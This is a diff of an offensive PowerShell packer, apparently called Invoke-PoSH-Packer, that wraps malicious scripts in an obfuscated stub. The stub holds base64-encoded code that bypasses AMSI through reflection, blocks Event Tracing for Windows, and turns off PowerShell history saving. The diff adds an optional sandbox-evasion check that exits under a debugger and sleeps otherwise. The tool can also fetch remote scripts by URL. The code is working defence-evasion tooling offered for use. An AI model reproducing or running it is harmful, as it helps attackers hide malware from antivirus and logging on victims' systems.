@@ -7,6 +7,7 @@
 # - AMSI bypass
 # - Blocking Event Tracing for Windows (ETW)
 # - Disabling PowerShell history logging
+# - Basic sandbox evasion techniques (optional -sandbox)
 # ==================================================================================================================
 # Usage: 
 # > Import-Module ./Invoke-PoSH-Packer.ps1
@@ -19,7 +20,7 @@ Write-Output "
  | _ \___/ __| || |___| _ \___  __| |_____ _ _ 
  |  _/ _ \__ \ __ |___|  _/ _ |/ _| / / -_) '_|
  |_| \___/___/_||_|   |_| \__,|\__|_\_\___|_|  
-                                             v1.0  
+                                             v1.1
 Usage: 
 > Invoke-PoSH-Packer -FileUrl https://URL/script.ps1 -OutFile C:\path\Packed-script.ps1
 > Invoke-PoSH-Packer -FilePath C:\path\script.ps1 -OutFile C:\path\Packed-script.ps1
@@ -29,6 +30,7 @@ Features:
 [*] AMSI bypass
 [*] Blocking Event Tracing for Windows (ETW)
 [*] Disabling PowerShell history logging
+[*] Basic sandbox evasion techniques (optional -sandbox)
 "
 
 # 'A'M'S'I' bypass to be able to download the offensive PowerShell scripts that we want to encrypt/obfuscate
@@ -41,21 +43,24 @@ function Invoke-PoSH-Packer {
         [Parameter(ValueFromPipeline,ValueFromPipelineByPropertyName)]
         [string] $filepath,
 		 
-		[Parameter(ValueFromPipeline,ValueFromPipelineByPropertyName)]
+	[Parameter(ValueFromPipeline,ValueFromPipelineByPropertyName)]
         [string] $fileurl,
-
+	
+	[Parameter(ValueFromPipeline,ValueFromPipelineByPropertyName)]
+        [switch] $sandbox,
+	
         [Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)]
         [string] $outfile = $(Throw("-OutFile is required"))
-		)
+	)
 	
     Process {
 		 
-	    if ($filepath) {	
-		Write-Output "[*] Loading the local file: '$($filepath)'"
+	if ($filepath) {	
+	Write-Output "[*] Loading the local file: '$($filepath)'"
         $codebytes = [System.IO.File]::ReadAllBytes($filepath)
-		}
-		elseif ($fileurl){
-		Write-Output "[*] Downloading the remote file: '$($fileurl)'"
+	}
+	elseif ($fileurl){
+	Write-Output "[*] Downloading the remote file: '$($fileurl)'"
         $Webclient = [Net.WebRequest]::Create($fileurl)
         $Webclient.Proxy = [Net.WebRequest]::GetSystemWebProxy()
         $Webclient.Proxy.Credentials = [Net.CredentialCache]::DefaultCredentials
@@ -132,34 +137,44 @@ function Invoke-PoSH-Packer {
         
         $stub_template = ''
         
-        Write-Output "[*] Adding 'A'M'S'I' bypass"
-        $code_fixed_order1 += '${9} = "JGJ5cCA9IFtSZWZdLkFzc2VtYmx5LkdldFR5cGVzKCk7Rm9yRWFjaCgkYmEgaW4gJGJ5cCkge2lmICgkYmEuTmFtZSAtbGlrZSAiKml1dGlscyIpIHskY2EgPSAkYmF9fTskZGEgPSAkY2EuR2V0RmllbG"' + "`r`n"
-        $stub_template += $code_fixed_order1 -join ''
-        $code_fixed_order2 += '${10} = "RzKCdOb25QdWJsaWMsU3RhdGljJyk7Rm9yRWFjaCgkZWEgaW4gJGRhKSB7aWYgKCRlYS5OYW1lIC1saWtlICIqaXRGYWlsZWQiKSB7JGZhID0gJGVhfX07JGZhLlNldFZhbHVlKCRudWxsLCR0cnVlKTsK"' + "`r`n"
+	if ($sandbox) {	
+        Write-Output "[*] Adding basic sandbox checks"
+        $code_fixed_order1 += '${17} = "aWYgKFQnZSdzJ3QnLVBBdEggVmFyJ2knYSdiJ2xlOlBTJ0QnZSdiJ3VnQ09OdGVYdCkge"' + "`r`n"
+	$stub_template += $code_fixed_order1 -join ''
+	$code_fixed_order2 += '${18} = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(${17}+"2V4aXR9IGVsc2Uge1MndCdhJ1JULVNsRSdFcCAtcyA2MH07"))' + "`r`n"
         $stub_template += $code_fixed_order2 -join ''
-	    $code_fixed_order3 += '${11} = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(${9}+${10}))' + "`r`n"
+        $code_fixed_order3 += 'iex(${18})' + "`r`n"
         $stub_template += $code_fixed_order3 -join ''
-        $code_fixed_order4 += 'iex(${11})' + "`r`n"
+        }
+		
+        Write-Output "[*] Adding 'A'M'S'I' bypass"
+        $code_fixed_order4 += '${9} = "JGJ5cCA9IFtSZWZdLkFzc2VtYmx5LkdldFR5cGVzKCk7Rm9yRWFjaCgkYmEgaW4gJGJ5cCkge2lmICgkYmEuTmFtZSAtbGlrZSAiKml1dGlscyIpIHskY2EgPSAkYmF9fTskZGEgPSAkY2EuR2V0RmllbG"' + "`r`n"
         $stub_template += $code_fixed_order4 -join ''
+        $code_fixed_order5 += '${10} = "RzKCdOb25QdWJsaWMsU3RhdGljJyk7Rm9yRWFjaCgkZWEgaW4gJGRhKSB7aWYgKCRlYS5OYW1lIC1saWtlICIqaXRGYWlsZWQiKSB7JGZhID0gJGVhfX07JGZhLlNldFZhbHVlKCRudWxsLCR0cnVlKTsK"' + "`r`n"
+        $stub_template += $code_fixed_order5 -join ''
+	$code_fixed_order6 += '${11} = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(${9}+${10}))' + "`r`n"
+        $stub_template += $code_fixed_order6 -join ''
+        $code_fixed_order7 += 'iex(${11})' + "`r`n"
+        $stub_template += $code_fixed_order7 -join ''
         
         Write-Output "[*] Adding 'E'T'W' bypass" 
-	    $code_fixed_order5 += '${12} = "R5cGUoJ1N5c3RlbS5NYW5hJysnZ2VtZW50LkF1dG8nKydtYXRpb24uVHJhY2luZy5QU0V0Jysnd0xvZ1ByJysnb3ZpZGVyJykuR0V0RmllTEQoJ2V0Jysnd1Byb3YnKydpZGVyJywnTm9uUCcrJ3VibGljLFN0YXRpYycpLkdlVFZhTHVlKCRudWxsKSwwKQ=="' + "`r`n"
-        $stub_template += $code_fixed_order5 -join ''
-        $code_fixed_order6 += '${13} = "W1JlZmxlQ3RpT04uQXNzRU1ibHldOjpMT0FkV2l0aFBBUnRpYWxOYU1lKCdTeXN0ZW0uQ29yZScpLkdlVFRZUGUoJ1N5c3QnKydlbS5EaWFnbicrJ29zdGljcy5FdmUnKydudGluZy5FdmVuJysndFByb3ZpZGVyJykuR2V0RmllbGQoJ21fZW5hYmxlZCcsJ05vblB1YmxpYyxJbnN0YW5jZScpLlNldFZhbHVlKFtSZWZdLkFzU0VtYkxZLkdldF"' + "`r`n"
-        $stub_template += $code_fixed_order6 -join ''
-        $code_fixed_order7 += '${14} = ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String(${13}+${12})))' + "`r`n"
-        $stub_template += $code_fixed_order7 -join ''
-        $code_fixed_order8 += 'iex(${14})' + "`r`n"
+	$code_fixed_order8 += '${12} = "R5cGUoJ1N5c3RlbS5NYW5hJysnZ2VtZW50LkF1dG8nKydtYXRpb24uVHJhY2luZy5QU0V0Jysnd0xvZ1ByJysnb3ZpZGVyJykuR0V0RmllTEQoJ2V0Jysnd1Byb3YnKydpZGVyJywnTm9uUCcrJ3VibGljLFN0YXRpYycpLkdlVFZhTHVlKCRudWxsKSwwKQ=="' + "`r`n"
         $stub_template += $code_fixed_order8 -join ''
-        
-        Write-Output "[*] Disabling PoSh history logging"
-        $code_fixed_order9 += '${15} = "U2V0LVBTUmVBZExJbmVPcFRpb24g"' + "`r`n"
+        $code_fixed_order9 += '${13} = "W1JlZmxlQ3RpT04uQXNzRU1ibHldOjpMT0FkV2l0aFBBUnRpYWxOYU1lKCdTeXN0ZW0uQ29yZScpLkdlVFRZUGUoJ1N5c3QnKydlbS5EaWFnbicrJ29zdGljcy5FdmUnKydudGluZy5FdmVuJysndFByb3ZpZGVyJykuR2V0RmllbGQoJ21fZW5hYmxlZCcsJ05vblB1YmxpYyxJbnN0YW5jZScpLlNldFZhbHVlKFtSZWZdLkFzU0VtYkxZLkdldF"' + "`r`n"
         $stub_template += $code_fixed_order9 -join ''
-        $code_fixed_order10 += '${16} = ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String(${15}+"LUhpc3RvcnlTYXZlU3R5bGUgU2F2J2VOJ290aCdpbidn")))' + "`r`n"
+        $code_fixed_order10 += '${14} = ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String(${13}+${12})))' + "`r`n"
         $stub_template += $code_fixed_order10 -join ''
-        $code_fixed_order11 += 'iex(${16})' + "`r`n"
+        $code_fixed_order11 += 'iex(${14})' + "`r`n"
         $stub_template += $code_fixed_order11 -join ''
         
+        Write-Output "[*] Disabling PoSh history logging"
+        $code_fixed_order12 += '${15} = "U2V0LVBTUmVBZExJbmVPcFRpb24g"' + "`r`n"
+        $stub_template += $code_fixed_order12 -join ''
+        $code_fixed_order13 += '${16} = ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String(${15}+"LUhpc3RvcnlTYXZlU3R5bGUgU2F2J2VOJ290aCdpbidn")))' + "`r`n"
+        $stub_template += $code_fixed_order13 -join ''
+        $code_fixed_order14 += 'iex(${16})' + "`r`n"
+        $stub_template += $code_fixed_order14 -join ''
+
         $code_alternatives  = @()
         $code_alternatives += '${2} = [System.Convert]::FromBase64String("{0}")' + "`r`n"
         $code_alternatives += '${3} = [System.Convert]::FromBase64String("{1}")' + "`r`n"
